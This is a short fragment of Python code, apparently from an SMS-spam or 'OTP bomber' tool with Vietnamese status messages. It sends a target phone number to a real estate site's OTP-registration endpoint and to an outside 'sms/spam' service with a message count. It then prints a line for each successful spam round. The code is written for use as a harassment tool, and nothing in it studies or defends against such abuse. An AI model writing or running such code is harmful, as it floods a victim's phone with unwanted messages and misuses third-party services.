...
def api(phone):
    response = requests.get(f"https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={phone}")

def spam_phone(phone, count):
    try:
        response = requests.get("https://subhatde.id.vn/sms/spam", params={
            "phone": phone,
            "amount": count
        })
        data = response.json()
        if data.get("success"):
            ...
            print(f"[i] {data.get('details')}")
        else:
            print(f"[!] Thất bại: {data.get('message')}")
    except Exception as e:
        print(f"[!] Lỗi khi gửi yêu cầu spam: {e}")
def run(phone,i):
    ...
    print(f"Spam thành công lần: {i} đến số {phone}")
